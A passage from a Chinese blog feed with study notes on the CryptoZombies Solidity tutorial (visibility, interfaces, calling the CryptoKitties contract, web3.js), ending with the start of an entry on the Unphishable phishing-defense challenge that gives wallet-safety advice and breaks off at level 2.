<code>msg.sender</code> 只能是这个僵尸的主人（类似于我们在 <code>createRandomZombie</code> 函数中做过的那样）。</li></ol><blockquote><p>注意：同样，因为我们的答案检查器比较呆萌，只认识把 <code>msg.sender</code> 放在前面的答案，如果你切换了参数的顺序，它就不认得了。 但你正常编码时，如何安排参数顺序都是正确的。</p></blockquote><ol><li>为了获取这个僵尸的DNA，我们的函数需要声明一个名为 <code>myZombie</code> 数据类型为<code>Zombie</code>的本地变量（这是一个 <code>storage</code> 型的指针）。 将其值设定为在 <code>zombies</code> 数组中索引为<code>_zombieId</code>所指向的值。</li></ol><p>到目前为止，包括函数结束符 <code>}</code> 的那一行， 总共4行代码。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Start here</span><br><span class="line">    function feedAndMultiply(uint _zombieId, uint _targetDna) public{</span><br><span class="line">        require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">        Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第8章-僵尸的DNA"><a href="#第8章-僵尸的DNA" class="headerlink" title="第8章: 僵尸的DNA"></a>第8章: 僵尸的DNA</h3><p>我们来把 <code>feedAndMultiply</code> 函数写完吧。</p><p>获取新的僵尸DNA的公式很简单：计算猎食僵尸DNA和被猎僵尸DNA之间的平均值。</p><p>例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function testDnaSplicing() public {</span><br><span class="line">  uint zombieDna = 2222222222222222;</span><br><span class="line">  uint targetDna = 4444444444444444;</span><br><span class="line">  uint newZombieDna = (zombieDna + targetDna) / 2;</span><br><span class="line">  // newZombieDna 将等于 3333333333333333</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>以后，我们也可以让函数变得更复杂些，比方给新的僵尸的 DNA 增加一些随机性之类的。但现在先从最简单的开始 —— 以后还可以回来完善它嘛。</p><p><strong>实战演习</strong></p><ol><li>首先我们确保 <code>_targetDna</code> 不长于16位。要做到这一点，我们可以设置 <code>_targetDna</code> 为 <code>_targetDna ％ dnaModulus</code> ，并且只取其最后16位数字。</li><li>接下来为我们的函数声明一个名叫 <code>newDna</code> 的 <code>uint</code>类型的变量，并将其值设置为 <code>myZombie</code>的 DNA 和 <code>_targetDna</code> 的平均值（如上例所示）。</li></ol><blockquote><p>注意：您可以用 <code>myZombie.name</code> 或 <code>myZombie.dna</code> 访问 <code>myZombie</code> 的属性。</p></blockquote><ol><li>一旦我们计算出新的DNA，再调用 <code>_createZombie</code> 就可以生成新的僵尸了。如果你忘了调用这个函数所需要的参数，可以查看 <code>zombiefactory.sol</code> 选项卡。请注意，需要先给它命名，所以现在我们把新的僵尸的名字设为<code>NoName</code> - 我们回头可以编写一个函数来更改僵尸的名字。</li></ol><blockquote><p>注意：对于 Solidity 高手，你可能会注意到我们的代码存在一个问题。别担心，下一章会解决这个问题的 ;）</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function feedAndMultiply(uint _zombieId, uint _targetDna) public {</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    // start here</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / 2;</span><br><span class="line">    _createZombie("NoName", newDna);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="第9章-更多关于函数可见性"><a href="#第9章-更多关于函数可见性" class="headerlink" title="第9章: 更多关于函数可见性"></a>第9章: 更多关于函数可见性</h3><p><strong>我们上一课的代码有问题！</strong></p><p>编译的时候编译器就会报错。</p><p>错误在于，我们尝试从 <code>ZombieFeeding</code> 中调用 <code>_createZombie</code> 函数，但 <code>_createZombie</code> 却是 <code>ZombieFactory</code> 的 <code>private</code> （私有）函数。这意味着任何继承自 <code>ZombieFactory</code> 的子合约都不能访问它。</p><p><strong>internal 和 external</strong></p><p>除 <code>public</code> 和 <code>private</code> 属性之外，Solidity 还使用了另外两个描述函数可见性的修饰词：<code>internal</code>（内部） 和 <code>external</code>（外部）。</p><p><code>internal</code> 和 <code>private</code> 类似，不过， 如果某个合约继承自其父合约，这个合约即可以访问父合约中定义的“内部”函数。（嘿，这听起来正是我们想要的那样！）。</p><p><code>external</code> 与<code>public</code> 类似，只不过这些函数只能在合约之外调用 - 它们不能被合约内的其他函数调用。稍后我们将讨论什么时候使用 <code>external</code> 和 <code>public</code>。</p><p>声明函数 <code>internal</code> 或 <code>external</code> 类型的语法，与声明 <code>private</code> 和 <code>public</code>类 型相同：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Sandwich {</span><br><span class="line">  uint private sandwichesEaten = 0;</span><br><span class="line"></span><br><span class="line">  function eat() internal {</span><br><span class="line">    sandwichesEaten++;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract BLT is Sandwich {</span><br><span class="line">  uint private baconSandwichesEaten = 0;</span><br><span class="line"></span><br><span class="line">  function eatWithBacon() public returns (string) {</span><br><span class="line">    baconSandwichesEaten++;</span><br><span class="line">    // 因为eat() 是internal 的，所以我们能在这里调用</span><br><span class="line">    eat();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><ol><li><p>将 <code>_createZombie()</code> 函数的属性从 <code>private</code> 改为 <code>internal</code> ， 使得其他的合约也能访问到它。</p><p> 我们已经成功把你的注意力集中在到<code>zombiefactory.sol</code>这个选项卡上啦。</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 在这里修改函数的功能</span><br><span class="line">    function _createZombie(string _name, uint _dna) internal {</span><br><span class="line">        uint id = zombies.push(Zombie(_name, _dna)) - 1;</span><br><span class="line">        zombieToOwner[id] = msg.sender;</span><br><span class="line">        ownerZombieCount[msg.sender]++;</span><br><span class="line">        NewZombie(id, _name, _dna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第10章-僵尸吃什么"><a href="#第10章-僵尸吃什么" class="headerlink" title="第10章: 僵尸吃什么?"></a>第10章: 僵尸吃什么?</h3><p>是时候让我们的僵尸去捕猎！ 那僵尸最喜欢的食物是什么呢？</p><p>Crypto 僵尸喜欢吃的是…</p><p><strong>CryptoKitties！</strong> 😱😱😱</p><p>（正经点，我可不是开玩笑😆）</p><p>为了做到这一点，我们要读出 CryptoKitties 智能合约中的 kittyDna。这些数据是公开存储在区块链上的。区块链是不是很酷？</p><p>别担心 —— 我们的游戏并不会伤害到任何真正的CryptoKitty。 我们只 <em>读取</em> CryptoKitties 数据，但却无法在物理上删除它。</p><p><strong>与其他合约的交互</strong></p><p>如果我们的合约需要和区块链上的其他的合约会话，则需先定义一个 <strong>interface</strong> (接口)。</p><p>先举一个简单的栗子。 假设在区块链上有这么一个合约：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract LuckyNumber {</span><br><span class="line">  mapping(address =&gt; uint) numbers;</span><br><span class="line"></span><br><span class="line">  function setNum(uint _num) public {</span><br><span class="line">    numbers[msg.sender] = _num;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  function getNum(address _myAddress) public view returns (uint) {</span><br><span class="line">    return numbers[_myAddress];</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这是个很简单的合约，您可以用它存储自己的幸运号码，并将其与您的以太坊地址关联。 这样其他人就可以通过您的地址查找您的幸运号码了。</p><p>现在假设我们有一个外部合约，使用 <code>getNum</code> 函数可读取其中的数据。</p><p>首先，我们定义 <code>LuckyNumber</code> 合约的 <strong>interface</strong> ：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract NumberInterface {</span><br><span class="line">  function getNum(address _myAddress) public view returns (uint);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>请注意，这个过程虽然看起来像在定义一个合约，但其实内里不同：</p><p>首先，我们只声明了要与之交互的函数 —— 在本例中为 <code>getNum</code> —— 在其中我们没有使用到任何其他的函数或状态变量。</p><p>其次，我们并没有使用大括号（<code>{</code> 和 <code>}</code>）定义函数体，我们单单用分号（<code>;</code>）结束了函数声明。这使它看起来像一个合约框架。</p><p>编译器就是靠这些特征认出它是一个接口的。</p><p>在我们的 app 代码中使用这个接口，合约就知道其他合约的函数是怎样的，应该如何调用，以及可期待什么类型的返回值。</p><p>在下一课中，我们将真正调用其他合约的函数。目前我们只要声明一个接口，用于调用 CryptoKitties 合约就行了。</p><p><strong>实战演习</strong></p><p>我们已经为你查看过了 CryptoKitties 的源代码，并且找到了一个名为 <code>getKitty</code>的函数，它返回所有的加密猫的数据，包括它的“基因”（我们的僵尸游戏要用它生成新的僵尸）。</p><p>该函数如下所示：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function getKitty(uint256 _id) external view returns (</span><br><span class="line">    bool isGestating,</span><br><span class="line">    bool isReady,</span><br><span class="line">    uint256 cooldownIndex,</span><br><span class="line">    uint256 nextActionAt,</span><br><span class="line">    uint256 siringWithId,</span><br><span class="line">    uint256 birthTime,</span><br><span class="line">    uint256 matronId,</span><br><span class="line">    uint256 sireId,</span><br><span class="line">    uint256 generation,</span><br><span class="line">    uint256 genes</span><br><span class="line">) {</span><br><span class="line">    Kitty storage kit = kitties[_id];</span><br><span class="line"></span><br><span class="line">    // if this variable is 0 then it's not gestating</span><br><span class="line">    isGestating = (kit.siringWithId != 0);</span><br><span class="line">    isReady = (kit.cooldownEndBlock &lt;= block.number);</span><br><span class="line">    cooldownIndex = uint256(kit.cooldownIndex);</span><br><span class="line">    nextActionAt = uint256(kit.cooldownEndBlock);</span><br><span class="line">    siringWithId = uint256(kit.siringWithId);</span><br><span class="line">    birthTime = uint256(kit.birthTime);</span><br><span class="line">    matronId = uint256(kit.matronId);</span><br><span class="line">    sireId = uint256(kit.sireId);</span><br><span class="line">    generation = uint256(kit.generation);</span><br><span class="line">    genes = kit.genes;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个函数看起来跟我们习惯的函数不太一样。 它竟然返回了…一堆不同的值！ 如果您用过 JavaScript 之类的编程语言，一定会感到奇怪 —— 在 Solidity中，您可以让一个函数返回多个值。</p><p>现在我们知道这个函数长什么样的了，就可以用它来创建一个接口：</p><p>1.定义一个名为 <code>KittyInterface</code> 的接口。 请注意，因为我们使用了 <code>contract</code> 关键字， 这过程看起来就像创建一个新的合约一样。</p><p>2.在interface里定义了 <code>getKitty</code> 函数（不过是复制/粘贴上面的函数，但在 <code>returns</code> 语句之后用分号，而不是大括号内的所有内容。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Create KittyInterface here</span><br><span class="line">contract KittyInterface {</span><br><span class="line">    function getKitty(uint256 _id) external view returns (</span><br><span class="line">    bool isGestating,</span><br><span class="line">    bool isReady,</span><br><span class="line">    uint256 cooldownIndex,</span><br><span class="line">    uint256 nextActionAt,</span><br><span class="line">    uint256 siringWithId,</span><br><span class="line">    uint256 birthTime,</span><br><span class="line">    uint256 matronId,</span><br><span class="line">    uint256 sireId,</span><br><span class="line">    uint256 generation,</span><br><span class="line">    uint256 genes</span><br><span class="line">    );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第11章-使用接口"><a href="#第11章-使用接口" class="headerlink" title="第11章: 使用接口"></a>第11章: 使用接口</h3><p>继续前面 <code>NumberInterface</code> 的例子，我们既然将接口定义为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract NumberInterface {</span><br><span class="line">  function getNum(address _myAddress) public view returns (uint);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以在合约中这样使用：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract MyContract {</span><br><span class="line">  address NumberInterfaceAddress = 0xab38...;</span><br><span class="line">  // ^ 这是FavoriteNumber合约在以太坊上的地址</span><br><span class="line">  NumberInterface numberContract = NumberInterface(NumberInterfaceAddress);</span><br><span class="line">  // 现在变量 `numberContract` 指向另一个合约对象</span><br><span class="line"></span><br><span class="line">  function someFunction() public {</span><br><span class="line">    // 现在我们可以调用在那个合约中声明的 `getNum`函数:</span><br><span class="line">    uint num = numberContract.getNum(msg.sender);</span><br><span class="line">    // ...在这儿使用 `num`变量做些什么</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>通过这种方式，只要将您合约的可见性设置为<code>public</code>(公共)或<code>external</code>(外部)，它们就可以与以太坊区块链上的任何其他合约进行交互。</p><p><strong>实战演习</strong></p><p>我们来建个自己的合约去读取另一个智能合约– CryptoKitties 的内容吧！</p><ol><li>我已经将代码中 CryptoKitties 合约的地址保存在一个名为 <code>ckAddress</code> 的变量中。在下一行中，请创建一个名为 <code>kittyContract</code> 的 KittyInterface，并用 <code>ckAddress</code> 为它初始化 —— 就像我们为 <code>numberContract</code>所做的一样。</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract ZombieFeeding is ZombieFactory {</span><br><span class="line"></span><br><span class="line">  address ckAddress = 0x06012c8cf97BEaD5deAe237070F9587f8E7A266d;</span><br><span class="line">  // Initialize kittyContract here using `ckAddress` from above</span><br><span class="line">    KittyInterface kittyContract = KittyInterface(ckAddress);</span><br><span class="line"></span><br><span class="line">  function feedAndMultiply(uint _zombieId, uint _targetDna) public {</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / 2;</span><br><span class="line">    _createZombie("NoName", newDna);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="第12章-处理多返回值"><a href="#第12章-处理多返回值" class="headerlink" title="第12章: 处理多返回值"></a>第12章: 处理多返回值</h3><p><code>getKitty</code> 是我们所看到的第一个返回多个值的函数。我们来看看是如何处理的：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function multipleReturns() internal returns(uint a, uint b, uint c) {</span><br><span class="line">  return (1, 2, 3);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">function processMultipleReturns() external {</span><br><span class="line">  uint a;</span><br><span class="line">  uint b;</span><br><span class="line">  uint c;</span><br><span class="line">  // 这样来做批量赋值:</span><br><span class="line">  (a, b, c) = multipleReturns();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 或者如果我们只想返回其中一个变量:</span><br><span class="line">function getLastReturnValue() external {</span><br><span class="line">  uint c;</span><br><span class="line">  // 可以对其他字段留空:</span><br><span class="line">  (,,c) = multipleReturns();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>是时候与 CryptoKitties 合约交互起来了！</p><p>我们来定义一个函数，从 kitty 合约中获取它的基因：</p><ol><li><p>创建一个名为 <code>feedOnKitty</code> 的函数。它需要2个 <code>uint</code> 类型的参数，<code>_zombieId</code> 和<code>_kittyId</code> ，这是一个 <code>public</code> 类型的函数。</p></li><li><p>函数首先要声明一个名为 <code>kittyDna</code> 的 <code>uint</code>。</p><blockquote><p>注意：在我们的 <code>KittyInterface</code> 中，<code>genes</code> 是一个 <code>uint256</code> 类型的变量，但是如果你记得，我们在第一课中提到过，<code>uint</code> 是 <code>uint256</code> 的别名，也就是说它们是一回事。</p></blockquote></li><li><p>这个函数接下来调用 <code>kittyContract.getKitty</code>函数, 传入 <code>_kittyId</code> ，将返回的 <code>genes</code> 存储在 <code>kittyDna</code> 中。记住 —— <code>getKitty</code> 会返回一大堆变量。 （确切地说10个 - 我已经为你数过了，不错吧！）。但是我们只关心最后一个– <code>genes</code>。数逗号的时候小心点哦！</p></li><li><p>最后，函数调用了 <code>feedAndMultiply</code> ，并传入了 <code>_zombieId</code> 和 <code>kittyDna</code> 两个参数。</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// define function here</span><br><span class="line">    function feedOnKitty(uint _zombieId, uint _kittyId) public{</span><br><span class="line">        uint kittyDna;</span><br><span class="line">        (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId);</span><br><span class="line">        feedAndMultiply(_zombieId,kittyDna);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h3 id="第13章-奖励-Kitty-基因"><a href="#第13章-奖励-Kitty-基因" class="headerlink" title="第13章: 奖励: Kitty 基因"></a>第13章: 奖励: Kitty 基因</h3><p>我们的功能逻辑主体已经完成了…现在让我们来添一个奖励功能吧。</p><p>这样吧，给从小猫制造出的僵尸添加些特征，以显示他们是猫僵尸。</p><p>要做到这一点，咱们在新僵尸的DNA中添加一些特殊的小猫代码。</p><p>还记得吗，第一课中我们提到，我们目前只使用16位DNA的前12位数来指定僵尸的外观。所以现在我们可以使用最后2个数字来处理“特殊”的特征。</p><p>这样吧，把猫僵尸DNA的最后两个数字设定为<code>99</code>（因为猫有9条命）。所以在我们这么来写代码：<code>如果</code>这个僵尸是一只猫变来的，就将它DNA的最后两位数字设置为<code>99</code>。</p><p><strong>if 语句</strong></p><p>if语句的语法在 Solidity 中，与在 JavaScript 中差不多：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function eatBLT(string sandwich) public {</span><br><span class="line">  // 看清楚了，当我们比较字符串的时候，需要比较他们的 keccak256 哈希码</span><br><span class="line">  if (keccak256(sandwich) == keccak256("BLT")) {</span><br><span class="line">    eat();</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>让我们在我们的僵尸代码中实现小猫的基因。</p><ol><li><p>首先，我们修改下 <code>feedAndMultiply</code> 函数的定义，给它传入第三个参数：一条名为 <code>_species</code> 的字符串。</p></li><li><p>接下来，在我们计算出新的僵尸的DNA之后，添加一个 <code>if</code> 语句来比较 <code>_species</code> 和字符串 <code>"kitty"</code> 的 <code>keccak256</code> 哈希值。</p></li><li><p>在 <code>if</code> 语句中，我们用 <code>99</code> 替换了新僵尸DNA的最后两位数字。可以这么做：<code>newDna = newDna - newDna % 100 + 99;</code>。</p><blockquote><p>解释：假设 <code>newDna</code> 是 <code>334455</code>。那么 <code>newDna % 100</code> 是 <code>55</code>，所以 <code>newDna - newDna % 100</code> 得到 <code>334400</code>。最后加上 <code>99</code> 可得到 <code>334499</code>。</p></blockquote></li><li><p>最后，我们修改了 <code>feedOnKitty</code> 中的函数调用。当它调用 <code>feedAndMultiply</code> 时，增加 <code>“kitty”</code> 作为最后一个参数。</p></li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 这里修改函数定义</span><br><span class="line">  function feedAndMultiply(uint _zombieId, uint _targetDna, string _species) public {</span><br><span class="line">    require(msg.sender == zombieToOwner[_zombieId]);</span><br><span class="line">    Zombie storage myZombie = zombies[_zombieId];</span><br><span class="line">    _targetDna = _targetDna % dnaModulus;</span><br><span class="line">    uint newDna = (myZombie.dna + _targetDna) / 2;</span><br><span class="line">    // 这里增加一个 if 语句</span><br><span class="line">    if(keccak256(_species) == keccak256("kitty")){</span><br><span class="line">        newDna = newDna - newDna % 100 + 99;</span><br><span class="line">    }</span><br><span class="line">    _createZombie("NoName", newDna);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  function feedOnKitty(uint _zombieId, uint _kittyId) public {</span><br><span class="line">    uint kittyDna;</span><br><span class="line">    (,,,,,,,,,kittyDna) = kittyContract.getKitty(_kittyId);</span><br><span class="line">    // 并修改函数调用</span><br><span class="line">    feedAndMultiply(_zombieId, kittyDna,"kitty");</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="第14章-放在一起"><a href="#第14章-放在一起" class="headerlink" title="第14章: 放在一起"></a>第14章: 放在一起</h3><p>至此，你已经学完第二课了！</p><p>查看下→_→的演示，看看他们怎么运行起来得吧。继续，你肯定等不及看完这一页😉。点击小猫，攻击！看到你斩获一个新的小猫僵尸了吧！</p><p><strong>JavaScript 实现</strong></p><p>我们只用编译和部署 <code>ZombieFeeding</code>，就可以将这个合约部署到以太坊了。我们最终完成的这个合约继承自 <code>ZombieFactory</code>，因此它可以访问自己和父辈合约中的所有 public 方法。</p><p>我们来看一个与我们的刚部署的合约进行交互的例子， 这个例子使用了 JavaScript 和 web3.js：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var abi = /* abi generated by the compiler */</span><br><span class="line">var ZombieFeedingContract = web3.eth.contract(abi)</span><br><span class="line">var contractAddress = /* our contract address on Ethereum after deploying */</span><br><span class="line">var ZombieFeeding = ZombieFeedingContract.at(contractAddress)</span><br><span class="line"></span><br><span class="line">// 假设我们有我们的僵尸ID和要攻击的猫咪ID</span><br><span class="line">let zombieId = 1;</span><br><span class="line">let kittyId = 1;</span><br><span class="line"></span><br><span class="line">// 要拿到猫咪的DNA，我们需要调用它的API。这些数据保存在它们的服务器上而不是区块链上。</span><br><span class="line">// 如果一切都在区块链上，我们就不用担心它们的服务器挂了，或者它们修改了API，</span><br><span class="line">// 或者因为不喜欢我们的僵尸游戏而封杀了我们</span><br><span class="line">let apiUrl = "https://api.cryptokitties.co/kitties/" + kittyId</span><br><span class="line">$.get(apiUrl, function(data) {</span><br><span class="line">  let imgUrl = data.image_url</span><br><span class="line">  // 一些显示图片的代码</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">// 当用户点击一只猫咪的时候:</span><br><span class="line">$(".kittyImage").click(function(e) {</span><br><span class="line">  // 调用我们合约的 `feedOnKitty` 函数</span><br><span class="line">  ZombieFeeding.feedOnKitty(zombieId, kittyId)</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">// 侦听来自我们合约的新僵尸事件好来处理</span><br><span class="line">ZombieFactory.NewZombie(function(error, result) {</span><br><span class="line">  if (error) return</span><br><span class="line">  // 这个函数用来显示僵尸:</span><br><span class="line">  generateZombie(result.zombieId, result.name, result.dna)</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p><strong>实战演习</strong></p><p>选择一只你想猎食的小猫。你自家僵尸的 DNA 会和小猫的 DNA 结合，生成一个新的小猫僵尸，加入你的军团！</p><p>看到新僵尸上那可爱的猫咪腿了么？这是新僵尸最后DNA中最后两位数字 <code>99</code> 的功劳！</p><p>你想要的话随时可以重新开始。捕获了一只猫咪僵尸，你一定很高兴吧！（不过你只能持有一只），继续前进到下一章，完成第二课吧！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Unphishable钓鱼攻防挑战</title>
      <link href="/2025/08/10/unphishable-diao-yu-gong-fang-tiao-zhan/"/>
      <url>/2025/08/10/unphishable-diao-yu-gong-fang-tiao-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="Unphishable钓鱼攻防挑战"><a href="#Unphishable钓鱼攻防挑战" class="headerlink" title="Unphishable钓鱼攻防挑战"></a>Unphishable钓鱼攻防挑战</h1><p>挑战地址：<a href="http://unphishable.io/">unphishable.io</a> </p><h2 id="初级"><a href="#初级" class="headerlink" title="初级"></a>初级</h2><h3 id="No-0x0001-Web3-钱包设置指南"><a href="#No-0x0001-Web3-钱包设置指南" class="headerlink" title="No.0x0001 Web3 钱包设置指南"></a>No.0x0001 Web3 钱包设置指南</h3><p>第一关就是创建一个MetaMask的小狐狸钱包，在这之前我就有一个钱包里。这关也重点强调了助记词的重要性。非常重要！！千万不能泄露，接下来一关我就中招了！</p><p>安全存储助记词方法附上：</p><ul><li>将其写在纸上（多份副本）</li><li>存放在安全、防水、防火的地方</li><li>考虑使用金属备份解决方案以提高耐久性</li><li>切勿以数字方式存储（不要拍照、不要云存储、不要电子邮件）</li><li>切勿与任何人分享，包括”支持人员”</li></ul><p>还有一个点就是要领取Holesky的测试币，找了几个水龙头都不是很好弄，看群里的小伙伴都是用Google水龙头领测试币，但是我的就用不了，Google的水龙头搞抽象，无法领取，问了群里大佬说他是这样的。不过最后找到一个好用的水龙头，不仅之前领了Sepolia的测试币，现在也领了Holesky的测试币，附上地址</p><p><a href="https://www.alchemy.com/faucets/ethereum-sepolia">https://www.alchemy.com/faucets/ethereum-sepolia</a></p><p>但是应该是需要eth主网上有一定量的以太币（0.001 ETH）才能在这里领测试币</p><p>领完测试币，连接钱包，这关就结束了</p><h3 id="No-0x0002-钱包恢复助手"><a href="#No-0x0002-钱包恢复助手" class="headerlink" title="No.0x0002 